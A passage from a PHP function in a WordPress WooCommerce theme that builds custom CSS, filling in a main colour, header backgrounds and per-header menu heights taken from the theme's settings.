		.type3 .item-grid .product .btn-cart-in a.add_to_cart_button:hover,
		.l-control .slick-arrow:hover,
		.sidebar .shop-banner .shopnow,
		.modus-blog .read-more:hover,
		.modus-box .layout3 .box3.style1 .link-more:hover,
		.modus-product-category .list-cat li:hover a,
		.modus-box .layout1.style1 .link-more:hover,
		.list-bottom .btn-cart:hover,
		.list-bottom .share-yith .btn-share:hover,
		.show-all .list-view-as li a:hover,
		.show-all .list-view-as li a.active,
		.site-footer .footer-center .widget .mc4wp-form-fields input[type='submit'],.about-info .btn-about{
			border-color: {$main_color};
		}
	
		.modus-product-tab .nav_type1 .view-more-product:hover,.modus-tab-loadmore .nav-2 .nav-tab ul li a.active{
			background: {$main_color};
		}
		.woocommerce-MyAccount-navigation ul li a:hover,
		.header_5 .nav-social li a:hover i,
		.header_fixed .header-v8 .main-nav ul > li.current_page_item > a,
		.header_fixed .header-v8 .main-nav ul > li.current_page_parent > a,
		.header_fixed .header-v8 .main-nav ul li a:hover,
		.header_fixed .header-v8 .main-nav ul >li > a:hover,
		.header_fixed .header-v8 .main-nav ul >li ul.children li.current_page_item a,
		.header_fixed .header-v8 .main-nav ul >li ul.children li a:hover,
		.item-grid.grid-type3 .price span, .item-grid.grid-type3 .price ins span,
		.modus-product-tab .nav_type1 .view-more-product,
		.modus-product-tab .nav-default nav li a.active,
		.modus-product-tab .nav-default nav li a:hover,
		.modus-blog .blog-list .blog.type-10 .read-more,
		.modus-blog .blog-list .blog.type-10 .postTitle .month,
		.modus-blog .blog-list .blog.type-10 .postTitle p,
		.best-furniture h3,
		.modus-tab-loadmore .nav-2 .nav-tab ul li a:hover,
		.modus-tab-loadmore .nav-2 .nav-tab ul li a.active,
		.modus-tab-loadmore .nav-3 .nav-tab ul li a:hover,
		.modus-tab-loadmore .nav-3 .nav-tab ul li a.active,
		.modus-product-tab .modus-tab-loadmore .nav_type3 .view-more-product,
		.modus-blog .blog-list .blog.type-9 .postTitle .month,
		.modus-blog .blog-list .blog.type-9 .postTitle p,
		.unique-box,
		.item-list.list-type2 .ct-product-right h2,
		.col-quick-form .request-form input[type='submit']:hover,
		.item-grid.grid-type1 .product .share-yith .btn-share i,
		.item-grid.grid-type5 .price span.woocommerce-Price-currencySymbol,
		.item-grid.grid-type5 .price span.amount,
		.view-detail:hover,
		.header_fixed .header-v3 .main-nav .children > li a:hover,
		.drop-message-form input[type='submit']:hover,
		.modus-blog.type5 .blog-read-more,
		.heading-title h2 em,
		.shortcode-title h2 em,
		.modus-timeline .about-time .label em,
		.modus-headingtitle.default .shortcode-title h2 em,
		.newsletter-fumiture5 .relative input[type='submit'],
		.footer.footer-v4 ul li a:hover,
		.l-control .slick-arrow:hover i,
		.modus-blog .list-type3 .blog-read-more:hover,
		.header-v3 .main-nav ul li a:hover,
		.header-v2 .main-nav ul li a:hover,
		.modus-box .layout1.style1 .link-more:hover,
		.blog .navigation.pagination .page-numbers:hover,
		.sidebar .shop-banner .shopnow:hover,
		.sidebar .shop-banner h3,
		.modus-blog .read-more:hover,
		.list-service li i,
		.modus-team .team-item .team-social ul li a:hover i,
		.modus-counter .stats-number,
		.site-footer .footercopyright a,.comming-soon .txt-heading a,
		.btn-share .add-to a,.header .mini-cart i:hover,
		body .site-footer .footer-v6 .footer-top ul li a:hover,
		body .footer-v6 .social-login-options .social a:hover,
		body .footer-v1 .widget.widget_nav_menu ul li a:hover,
		body .site-footer .footer-v1 ul li a:hover,
		body .best-furniture .shop-now:hover,
		body .best-furniture .shop-now i,
		.modus-icon.modus-icon-2 .modus-iconbox .box-icon .title:hover,
		.site-footer .footer-v6 .textwidget a:hover,
		 .modus-counter .list-counter-2 .stats-number:hover,
		 .modus-counter .list-counter-2 .text:hover{
			color: {$main_color};
		}
		.button-wed a{
			background: {$main_color};
		}
		.modus-product-category .list-cat li:hover .triangle-right,
		.modus-product-category .list-cat li.active .triangle-right,.tooltip.left .tooltip-arrow{
			border-left-color: {$main_color} !important;
		}
		.view-more-product .view-more-product-1:hover,
		.header-v8 .main-nav ul > li.current_page_item > a,
		.header-v8 .main-nav ul > li.current_page_parent > a,
		.header-v8 .main-nav ul > li:hover > a,
		.header,.modus-blog .read-more,
		.modus-services .layout2 .item-service .bg-op:before,.md_bg_color:after{
			border-bottom-color: {$main_color};
		}

		.md-outdoor .md-oran a:hover,.md-outdoor .md-blue a:hover,.md-outdoor .md-black a:hover,.woocommerce table.shop_table.woocommerce-checkout-review-order-table td:last-child span.amount,.cart-subtotal .amount,.order-total .amount,.cart-subtotal .amount span,.woocommerce table.shop_table.woocommerce-checkout-review-order-table td:last-child span.amount, .cart-subtotal .amount, .order-total .amount, .cart-subtotal .amount span, .product-total .amount span, .order-total  .amount span, .product-total .amount, .order_details .amount, .order_details .amount span{
			color: {$main_color};
		}
		.modus-tab-loadmore .nav-4 li a:hover span:before,
		.modus-tab-loadmore .nav-4 li a.active span:before,.tooltip.top .tooltip-arrow{
			border-top-color: {$main_color} !important;
		}
		.tooltip-inner {
			background:{$main_color};
		}
		.modus-social li a:hover i{
			color:{$main_color};
		}
		.thecube .cube:before {
		  background-color: {$main_color};
		}
		.woocommerce .cart .button:hover, 
		.woocommerce .cart input.button:hover{
			background-color: {$main_color} !important;
		}
		body .md-wc-6 a.view-more,
		body .txt-big-sale a.view-more-product,
		body .modus-blog .blog-read-more,
		body .price-custom.ult_design_1 .ult_pricing_table .ult_price_link .ult_price_action_button{
			border-bottom-color: {$main_color};
		}
		body .md-wc-6 a.view-more:hover,
		body .modus-blog.type6 .blog-read-more:hover,
		body .site-footer .footer-v5 .widget.widget_nav_menu ul li a:hover{
			color: {$main_color};
		}
		body .price-custom.ult_design_1 .ult_pricing_table .ult_price_link .ult_price_action_button:hover,
		body .txt-big-sale a.view-more-product:hover,
		body .modal-box-custom button:hover{
			color: {$main_color} !important;
		}
		body .bg-tes .slick-dots li.slick-active, 
		body .bg-tes .slick-dots li:hover {
			border-color: {$main_color};
			background-color: {$main_color};
		}
		body .slide-shop-now{
			border-color: {$main_color};
		}
		body .footer-v1 .footer-tops .mc4wp-form-fields .newletter-label,
		body scroll-to-top,
		body .sale-30 span,
		body .author_info,
		body .blog-video a i:hover,
		body .quote_section .link-post a:hover{
			color: {$main_color};
		}
		body .footer-top-1 .mc4wp-form-fields .relative input + input,
		body .slide-product.type5 .product-thumbnails a:not(.view-more)::before,
		body .modus-blog .blog-list .type-7 .md-blog-text::before,
		body .two-line .line-headingtitle::before,
		body .projects .vc_grid-filter > .vc_grid-filter-item > span::before,
		body .quote_section .link-icon,
		body .blog-gallery .slick-arrow {
			background-color: {$main_color};
		}
		header .header,
		.is-sticky .header{
			background-color: {$header_bg};
		}
		header.is-sticky .header.header-v2,
		header.is-sticky .header.header-v9{
			background-color: {$header_bg_sticky};
		}
		@media (max-width: 991px){
			header .header.header-v2,
			header .header.header-v9,
			header:not(.is-sticky) .header_fixed .header.header-v9{
				background-color: {$header_bg_sticky};
			}
		}
	";
	if (isset($modus_settings['height_menu_1']) && $modus_settings['height_menu_1'] != '') {
        if (isset($modus_settings['height_menu_1']['height']) && $modus_settings['height_menu_1']['height'] != '') {
            $modus_custom_css .= "
				@media (min-width: 992px){
					header:not(.is-sticky) .header-v1 .cl-table, 
					header:not(.is-sticky) .header-v1 .mini-cart,
					header:not(.is-sticky) .header-v1 .main-nav .main-navigation > div > ul > li > a{
						height: {$modus_settings['height_menu_1']['height']};
					}
				}
            ";
        }
    }
	if (isset($modus_settings['height_menu_2']) && $modus_settings['height_menu_2'] != '') {
        if (isset($modus_settings['height_menu_2']['height']) && $modus_settings['height_menu_2']['height'] != '') {
            $modus_custom_css .= "
				@media (min-width: 992px){
					header:not(.is-sticky) .header-v2 .logo, 
					header:not(.is-sticky) .header-v2 .main-nav .main-navigation > div > ul > li > a{
						height: {$modus_settings['height_menu_2']['height']};
					}
				}
            ";
        }
    }
	if (isset($modus_settings['height_menu_3']) && $modus_settings['height_menu_3'] != '') {
        if (isset($modus_settings['height_menu_3']['height']) && $modus_settings['height_menu_3']['height'] != '') {
            $modus_custom_css .= "
				@media (min-width: 992px){
					header:not(.is-sticky) .header-v3.header .right .mini-cart, 
					header:not(.is-sticky) .header-v3 .logo,
					header:not(.is-sticky) .header-v3 .main-nav .main-navigation > div > ul > li > a{
						height: {$modus_settings['height_menu_3']['height']};
					}
				}
            ";
        }
    }
	if (isset($modus_settings['height_menu_4']) && $modus_settings['height_menu_4'] != '') {
        if (isset($modus_settings['height_menu_4']['height']) && $modus_settings['height_menu_4']['height'] != '') {
            $modus_custom_css .= "
				@media (min-width: 992px){
					header:not(.is-sticky) .header_4 .header-v1 .cl-table, 
					header:not(.is-sticky) .header_4 .header-v1 .mini-cart,
					header:not(.is-sticky) .header_4 .header-v1 .main-nav .main-navigation > div > ul > li > a{
						height: {$modus_settings['height_menu_4']['height']};
					}
				}
            ";
        }
    }
	if (isset($modus_settings['height_menu_5']) && $modus_settings['height_menu_5'] != '') {
        if (isset($modus_settings['height_menu_5']['height']) && $modus_settings['height_menu_5']['height'] != '') {
            $modus_custom_css .= "
				@media (min-width: 992px){
					header:not(.is-sticky) .header-v5.header .right .mini-cart, 
					header:not(.is-sticky) .header-v5 h1.logo_home,
					header:not(.is-sticky) .header-v5 .logo-page,
					header:not(.is-sticky) .header-v5 .main-nav .main-navigation > div > ul > li > a{
						height: {$modus_settings['height_menu_5']['height']};
					}
				}
            ";
        }
    }
	if (isset($modus_settings['height_menu_6']) && $modus_settings['height_menu_6'] != '') {
        if (isset($modus_settings['height_menu_6']['height']) && $modus_settings['height_menu_6']['height'] != '') {
            $modus_custom_css .= "
				@media (min-width: 992px){
					header:not(.is-sticky) .header-v6.header .header-right, 
					header:not(.is-sticky) .header-v6.header .call-usv6,
					header:not(.is-sticky) .header-v6.header .logo,
					header:not(.is-sticky) .header-v6.header .main-nav .main-navigation > div > ul > li > a{
						height: {$modus_settings['height_menu_6']['height']};
					}
				}
            ";
        }
    }
	if (isset($modus_settings['height_menu_7']) && $modus_settings['height_menu_7'] != '') {
        if (isset($modus_settings['height_menu_7']['height']) && $modus_settings['height_menu_7']['height'] != '') {
            $modus_custom_css .= "
				@media (min-width: 992px){
					header:not(.is-sticky) .header-v7 .logo-page,
					header:not(.is-sticky) .header-v7 h1.logo_home,
					header:not(.is-sticky) .header-v7 .main-nav .main-navigation > div > ul > li > a{
						height: {$modus_settings['height_menu_7']['height']};
					}
				}
            ";
        }
    }
	if (isset($modus_settings['height_menu_8']) && $modus_settings['height_menu_8'] != '') {
        if (isset($modus_settings['height_menu_8']['height']) && $modus_settings['height_menu_8']['height'] != '') {
            $modus_custom_css .= "
				@media (min-width: 992px){
					header:not(.is-sticky) .header-v8 .logo-page,
					header:not(.is-sticky) .header-v8 h1.logo_home,
					header:not(.is-sticky) .header-v8 .main-nav .main-navigation > div > ul > li > a{
						height: {$modus_settings['height_menu_8']['height']};
					}
				}
            ";
        }
    }
	if (isset($modus_settings['height_menu_9']) && $modus_settings['height_menu_9'] != '') {
        if (isset($modus_settings['height_menu_9']['height']) && $modus_settings['height_menu_9']['height'] != '') {
            $modus_custom_css .= "
				@media (min-width: 992px){
					header:not(.is-sticky) .header-v9 .logo-page,
					header:not(.is-sticky) .header-v9 h1.logo_home,
					header:not(.is-sticky) .header-v9 .main-nav .main-navigation > div > ul > li > a{
						height: {$modus_settings['height_menu_9']['height']};
					}
				}
            ";
        }
    }
	if (isset($modus_settings['height_menu_10']) && $modus_settings['height_menu_10'] != '') {
        if (isset($modus_settings['height_menu_10']['height']) && $modus_settings['height_menu_10']['height'] != '') {
            $modus_custom_css .= "
				@media (min-width: 992px){
					header:not(.is-sticky) .header-v10 .header_wrap .cl-table{
						height: {$modus_settings['height_menu_10']['height']};
					}
				}
            ";
        }
    }
	return $modus_custom_css;
}
